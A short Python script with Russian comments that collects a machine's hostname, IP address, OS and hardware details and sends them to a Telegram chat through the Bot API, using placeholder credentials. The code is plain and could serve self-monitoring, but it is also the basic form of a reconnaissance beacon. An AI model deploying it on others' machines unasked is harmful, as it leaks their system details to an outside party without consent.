import requests
import socket
import platform
import telebot

# Вставьте ваш токен Telegram-бота
TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
# Вставьте ваш чат ID Telegram
CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID'

# Получение информации об устройстве
def get_device_info():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    system = platform.system()
    release = platform.release()
    version = platform.version()
    machine = platform.machine()
    processor = platform.processor()
    
    device_info = f"Hostname: {hostname}\nIP Address: {ip_address}\nSystem: {system}\nRelease: {release}\nVersion: {version}\nMachine: {machine}\nProcessor: {processor}"
    
    return device_info

# Отправка сообщения в Telegram
def send_message(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    params = {
        'chat_id': CHAT_ID,
        'text': message
    }
    response = requests.get(url, params=params)
    if response.status_code == 200:
        print("Сообщение успешно отправлено в Telegram!")
    else:
        print("Ошибка отправки сообщения в Telegram.")

# Основная функция
def main():
    device_info = get_device_info()
    send_message(device_info)

if __name__ == '__main__':
    main()
